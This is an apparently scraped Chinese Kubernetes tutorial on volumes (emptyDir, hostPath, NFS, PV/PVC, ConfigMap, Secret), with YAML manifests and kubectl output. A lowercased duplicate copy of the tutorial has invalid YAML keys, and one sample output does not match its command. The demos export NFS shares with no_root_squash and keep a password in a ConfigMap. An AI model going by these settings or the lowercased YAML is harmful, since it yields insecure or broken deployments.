#共享文件路径\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4）最后，运行下 pod，观察结果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\nvolume-nfs        2/2     Running   0          2m9s\n\n# 查看nfs服务器上的共享目录，发现已经有文件了\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 高级存储\n\n前面已经学习了使用 NFS 提供存储，此时就要求用户会搭建 NFS 系统，并且会在 yaml 配置 nfs。由于 kubernetes 支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes 引入 PV 和 PVC 两种资源对象。\n\nPV（Persistent Volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下 PV 由 kubernetes 管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。\n\nPVC（Persistent Volume Claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，PVC 其实就是用户向 kubernetes 系统发出的一种资源需求申请。\n\n\n\n使用了 PV 和 PVC 之后，工作可以得到进一步的细分：\n\n * 存储：存储工程师维护\n * PV： kubernetes 管理员维护\n * PVC：kubernetes 用户维护\n\n\n# PV\n\nPV 是存储资源的抽象，下面是资源清单文件:\n\napiVersion: v1  \nkind: PersistentVolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # 存储类型，与底层真正存储对应\n  capacity:  # 存储能力，目前只支持存储空间的设置\n    storage: 2Gi\n  accessModes:  # 访问模式\n  storageClassName: # 存储类别\n  persistentVolumeReclaimPolicy: # 回收策略\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nPV 的关键配置参数说明：\n\n * 存储类型\n   底层实际存储的类型，kubernetes 支持多种存储类型，每种存储类型的配置都有所差异\n * 存储能力（capacity）\n   目前只支持存储空间的设置 (storage=1Gi)，不过未来可能会加入 IOPS、吞吐量等指标的配置\n * 访问模式（accessModes）\n   用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式：\n   * ReadWriteOnce（RWO）：读写权限，但是只能被单个节点挂载 (指的是 PV 与 PVC 绑定只能一个)\n   * ReadOnlyMany（ROX）： 只读权限，可以被多个节点挂载\n   * ReadWriteMany（RWX）：读写权限，可以被多个节点挂载\n     需要注意的是，底层不同的存储类型可能支持的访问模式不同\n * 回收策略（persistentVolumeReclaimPolicy）\n   当 PV 不再被使用了之后，对其的处理方式。目前支持三种策略：\n   * Retain （保留） 保留数据，需要管理员手工清理数据\n   * Recycle（回收） 清除 PV 中的数据，效果相当于执行 rm -rf /thevolume/*\n   * Delete （删除） 与 PV 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务\n     需要注意的是，底层不同的存储类型可能支持的回收策略不同\n * 存储类别\n   PV 可以通过 storageClassName 参数指定一个存储类别\n   * 具有特定类别的 PV 只能与请求了该类别的 PVC 进行绑定\n   * 未设定类别的 PV 则只能与不请求任何类别的 PVC 进行绑定\n * 状态（status）\n   一个 PV 的生命周期中，可能会处于 4 中不同的阶段：\n   * Available（可用）： 表示可用状态，还未被任何 PVC 绑定\n   * Bound（已绑定）： 表示 PV 已经被 PVC 绑定\n   * Released（已释放）： 表示 PVC 被删除，但是资源还未被集群重新声明\n   * Failed（失败）： 表示该 PV 的自动回收失败\n\n实验\n使用 NFS 作为存储，来演示 PV 的使用，创建 3 个 PV，对应 NFS 中的 3 个暴露的路径。\n1. 准备 NFS 环境\n\n# 创建目录\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# 暴露服务\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# 重启服务\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. 创建 pv.yaml\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# 创建 pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME   CAPACITY   ACCESS MODES  RECLAIM POLICY  STATUS      AGE   VOLUMEMODE\npv1    1Gi        RWX            Retain        Available    10s   Filesystem\npv2    2Gi        RWX            Retain        Available    10s   Filesystem\npv3    3Gi        RWX            Retain        Available    9s    Filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# PVC\n\nPVC 是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是资源清单文件:\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessModes: # 访问模式\n  selector: # 采用标签对PV选择\n  storageClassName: # 存储类别\n  resources: # 请求空间\n    requests:\n      storage: 5Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nPVC 的关键配置参数说明：\n\n * 访问模式（accessModes）\n   用于描述用户应用对存储资源的访问权限\n * 选择条件（selector）\n   通过 Label Selector 的设置，可使 PVC 对于系统中己存在的 PV 进行筛选\n * 存储类别（storageClassName）\n   PVC 在定义时可以设定需要的后端存储的类别，只有设置了该 class 的 pv 才能被系统选出\n * 资源请求（Resources ）\n   描述对存储资源的请求\n\n实验\n1. 创建 pvc.yaml，申请 pv\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# 创建pvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX                           15s   Filesystem\npvc2   Bound    pv2      2Gi        RWX                           15s   Filesystem\npvc3   Bound    pv3      3Gi        RWX                           15s   Filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME  CAPACITY ACCESS MODES  RECLAIM POLICY  STATUS    CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWx        Retain          Bound    dev/pvc1    3h37m    Filesystem\npv2    2Gi        RWX        Retain          Bound    dev/pvc2    3h37m    Filesystem\npv3    3Gi        RWX        Retain          Bound    dev/pvc3    3h37m    Filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. 创建 pods.yaml, 使用 pv\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc1\n        readOnly: false\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc2\n        readOnly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME   READY   STATUS    RESTARTS   AGE   IP            NODE   \npod1   1/1     Running   0          14s   10.244.1.69   node1   \npod2   1/1     Running   0          14s   10.244.1.70   node1  \n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES      AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX               94m   Filesystem\npvc2   Bound    pv2      2Gi        RWX               94m   Filesystem\npvc3   Bound    pv3      3Gi        RWX               94m   Filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWX            Retain           Bound    dev/pvc1    5h11m   Filesystem\npv2    2Gi        RWX            Retain           Bound    dev/pvc2    5h11m   Filesystem\npv3    3Gi        RWX            Retain           Bound    dev/pvc3    5h11m   Filesystem\n\n# 查看nfs中的文件存储\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 生命周期\n\nPVC 和 PV 是一一对应的，PV 和 PVC 之间的相互作用遵循以下生命周期：\n\n * 资源供应：管理员手动创建底层存储和 PV\n * 资源绑定：用户创建 PVC，kubernetes 负责根据 PVC 的声明去寻找 PV，并绑定\n   在用户定义好 PVC 之后，系统将根据 PVC 对存储资源的请求在已存在的 PV 中选择一个满足条件的\n   * 一旦找到，就将该 PV 与用户定义的 PVC 进行绑定，用户的应用就可以使用这个 PVC 了\n   * 如果找不到，PVC 则会无限期处于 Pending 状态，直到等到系统管理员创建了一个符合其要求的 PV\n     PV一旦绑定到某个PVC上，就会被这个PVC独占，不能再与其他PVC进行绑定了\n * 资源使用：用户可在 pod 中像 volume 一样使用 pvc\n   Pod 使用 Volume 的定义，将 PVC 挂载到容器内的某个路径进行使用。\n * 资源释放：用户删除 pvc 来释放 pv\n   当存储资源使用完毕后，用户可以删除 PVC，与该 PVC 绑定的 PV 将会被标记为 “已释放”，但还不能立刻与其他 PVC 进行绑定。通过之前 PVC 写入的数据可能还被留在存储设备上，只有在清除之后该 PV 才能再次使用。\n * 资源回收：kubernetes 根据 pv 设置的回收策略进行资源的回收\n   对于 PV，管理员可以设定回收策略，用于设置与之绑定的 PVC 释放资源之后如何处理遗留数据的问题。只有 PV 的存储空间完成回收，才能供新的 PVC 绑定和使用\n\n\n\n\n# 配置存储\n\n\n# ConfigMap\n\nConfigMap 是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。\n\n创建 configmap.yaml，内容如下：\n\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，使用此配置文件创建 configmap\n\n# 创建configmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# 查看configmap详情\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nName:         configmap\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nEvents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n接下来创建一个 pod-configmap.yaml，将上面创建的 configmap 挂载进去\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # 将configmap挂载到目录\n    - name: config\n      mountPath: /configmap/config\n  volumes: # 引用configmap\n  - name: config\n    configMap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-configmap   1/1     Running   0          6s\n\n#进入容器\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# 可以看到映射已经成功，每个configmap都映射成了一个目录\n# key---\x3e文件     value----\x3e文件中的内容\n# 此时如果更新configmap的内容, 容器中的值也会动态更新\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Secret\n\n在 kubernetes 中，还存在一种和 ConfigMap 非常类似的对象，称为 Secret 对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。\n\n1. 首先使用 base64 对数据进行编码\n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #准备username\nYWRtaW4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #准备password\nMTIzNDU2\n\n\n1\n2\n3\n4\n\n\n2. 接下来编写 secret.yaml，并创建 Secret\n\napiVersion: v1\nkind: Secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: Opaque\ndata:\n  username: YWRtaW4=\n  password: MTIzNDU2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 创建secret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# 查看secret详情\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nName:         secret\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\nType:  Opaque\nData\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. 创建 pod-secret.yaml，将上面创建的 secret 挂载进去：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # 将secret挂载到目录\n    - name: config\n      mountPath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretName: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-secret      1/1     Running   0          2m28s\n\n# 进入容器，查看secret信息，发现已经自动解码了\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n至此，已经实现了利用 secret 实现了信息的编码。',normalizedContent:'在前面已经提到，容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes 引入了 volume 的概念。\n\nvolume 是 pod 中能够被多个容器访问的共享目录，它被定义在 pod 上，然后被一个 pod 里的多个容器挂载到具体的文件目录下，kubernetes 通过 volume 实现同一个 pod 中不同容器之间的数据共享以及数据的持久化存储。volume 的生命容器不与 pod 中单个容器的生命周期相关，当容器终止或者重启时，volume 中的数据也不会丢失。\n\nkubernetes 的 volume 支持多种类型，比较常见的有下面几个：\n\n * 简单存储：emptydir、hostpath、nfs\n * 高级存储：pv、pvc\n * 配置存储：configmap、secret\n\n\n# 基本存储\n\n\n# emptydir\n\nemptydir 是最基础的 volume 类型，一个 emptydir 就是 host 上的一个空目录。\n\nemptydir 是在 pod 被分配到 node 时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为 kubernetes 会自动分配一个目录，当 pod 销毁时， emptydir 中的数据也会被永久删除。 emptydir 用途如下：\n\n * 临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留\n * 一个容器需要从另一个容器中获取数据的目录（多容器共享目录）\n\n接下来，通过一个容器之间文件共享的案例来使用一下 emptydir。\n\n在一个 pod 中准备两个容器 nginx 和 busybox，然后声明一个 volume 分别挂在到两个容器的目录中，然后 nginx 容器负责向 volume 中写日志，busybox 中通过命令将日志内容读到控制台。\n\n\n\n创建一个 volume-emptydir.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:  # 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # 初始命令，动态读取指定文件中内容\n    volumemounts:  # 将logs-volume 挂在到busybox容器中，对应的目录为 /logs\n    - name: logs-volume\n      mountpath: /logs\n  volumes: # 声明volume， name为logs-volume，类型为emptydir\n  - name: logs-volume\n    emptydir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nname                  ready   status    restarts   age      ip       node   ...... \nvolume-emptydir       2/2     running   0          97s   10.42.2.9   node1  ......\n\n# 通过podip访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# 通过kubectl logs命令查看指定容器的标准输出\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/jun/2021:15:08:54 +0000] "get / http/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# hostpath\n\nemptydir 中数据不会被持久化，它会随着 pod 的结束而销毁，如果想简单的将数据持久化到主机中，可以选择 hostpath。\n\nhostpath 就是将 node 主机中一个实际目录挂在到 pod 中，以供容器使用，这样的设计就可以保证 pod 销毁了，但是数据依据可以存在于 node 主机上。\n\n\n\n创建一个 volume-hostpath.yaml：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    hostpath: \n      path: /root/logs #宿主机目录\n      type: directoryorcreate  # 目录存在就使用，不存在就先创建后使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> 关于 type 的值的一点说明：\n> directoryorcreate 目录存在就使用，不存在就先创建后使用\n> directory 目录必须存在\n> fileorcreate 文件存在就使用，不存在就先创建后使用\n> file 文件必须存在\n> socket unix 套接字必须存在\n> chardevice 字符设备必须存在\n> blockdevice 块设备必须存在\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nname                  ready   status    restarts   age   ip             node   ......\npod-volume-hostpath   2/2     running   0          16s   10.42.2.10     node1  ......\n\n#访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# 接下来就可以去host的/root/logs目录下查看存储的文件了\n###  注意: 下面的操作需要到pod所在的节点运行（案例中是node1）\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# 同样的道理，如果在此目录下创建一个文件，到容器中也是可以看到的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> 注意：pod 被 k8s 部署在哪个 node，文件就在那个 node 上挂载\n\n\n# nfs\n\nhostpath 可以解决数据持久化的问题，但是一旦 node 节点故障了，pod 如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用 nfs、cifs。\n\nnfs 是一个网络文件存储系统，可以搭建一台 nfs 服务器，然后将 pod 中的存储直接连接到 nfs 系统上，这样的话，无论 pod 在节点上怎么转移，只要 node 跟 nfs 的对接没问题，数据就可以成功访问。\n\n\n\n1）首先要准备 nfs 的服务器，这里为了简单，直接是 master 节点做 nfs 服务器\n\n# 在nfs上安装nfs服务\n[root@nfs ~]# yum install nfs-utils -y\n\n# 准备一个共享目录\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# 将共享目录以读写权限暴露给192.168.5.0/24网段中的所有主机\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# 启动nfs服务\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2）接下来，要在的每个 node 节点上都安装下 nfs，这样的目的是为了 node 节点可以驱动 nfs 设备\n\n# 在node上安装nfs服务，注意不需要启动\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3）接下来，就可以编写 pod 的配置文件了，创建 volume-nfs.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfs服务器地址\n      path: /root/data/nfs #共享文件路径\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4）最后，运行下 pod，观察结果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nname                  ready   status    restarts   age\nvolume-nfs        2/2     running   0          2m9s\n\n# 查看nfs服务器上的共享目录，发现已经有文件了\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 高级存储\n\n前面已经学习了使用 nfs 提供存储，此时就要求用户会搭建 nfs 系统，并且会在 yaml 配置 nfs。由于 kubernetes 支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes 引入 pv 和 pvc 两种资源对象。\n\npv（persistent volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下 pv 由 kubernetes 管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。\n\npvc（persistent volume claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，pvc 其实就是用户向 kubernetes 系统发出的一种资源需求申请。\n\n\n\n使用了 pv 和 pvc 之后，工作可以得到进一步的细分：\n\n * 存储：存储工程师维护\n * pv： kubernetes 管理员维护\n * pvc：kubernetes 用户维护\n\n\n# pv\n\npv 是存储资源的抽象，下面是资源清单文件:\n\napiversion: v1  \nkind: persistentvolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # 存储类型，与底层真正存储对应\n  capacity:  # 存储能力，目前只支持存储空间的设置\n    storage: 2gi\n  accessmodes:  # 访问模式\n  storageclassname: # 存储类别\n  persistentvolumereclaimpolicy: # 回收策略\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\npv 的关键配置参数说明：\n\n * 存储类型\n   底层实际存储的类型，kubernetes 支持多种存储类型，每种存储类型的配置都有所差异\n * 存储能力（capacity）\n   目前只支持存储空间的设置 (storage=1gi)，不过未来可能会加入 iops、吞吐量等指标的配置\n * 访问模式（accessmodes）\n   用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式：\n   * readwriteonce（rwo）：读写权限，但是只能被单个节点挂载 (指的是 pv 与 pvc 绑定只能一个)\n   * readonlymany（rox）： 只读权限，可以被多个节点挂载\n   * readwritemany（rwx）：读写权限，可以被多个节点挂载\n     需要注意的是，底层不同的存储类型可能支持的访问模式不同\n * 回收策略（persistentvolumereclaimpolicy）\n   当 pv 不再被使用了之后，对其的处理方式。目前支持三种策略：\n   * retain （保留） 保留数据，需要管理员手工清理数据\n   * recycle（回收） 清除 pv 中的数据，效果相当于执行 rm -rf /thevolume/*\n   * delete （删除） 与 pv 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务\n     需要注意的是，底层不同的存储类型可能支持的回收策略不同\n * 存储类别\n   pv 可以通过 storageclassname 参数指定一个存储类别\n   * 具有特定类别的 pv 只能与请求了该类别的 pvc 进行绑定\n   * 未设定类别的 pv 则只能与不请求任何类别的 pvc 进行绑定\n * 状态（status）\n   一个 pv 的生命周期中，可能会处于 4 中不同的阶段：\n   * available（可用）： 表示可用状态，还未被任何 pvc 绑定\n   * bound（已绑定）： 表示 pv 已经被 pvc 绑定\n   * released（已释放）： 表示 pvc 被删除，但是资源还未被集群重新声明\n   * failed（失败）： 表示该 pv 的自动回收失败\n\n实验\n使用 nfs 作为存储，来演示 pv 的使用，创建 3 个 pv，对应 nfs 中的 3 个暴露的路径。\n1. 准备 nfs 环境\n\n# 创建目录\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# 暴露服务\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# 重启服务\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. 创建 pv.yaml\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv3\n    server: 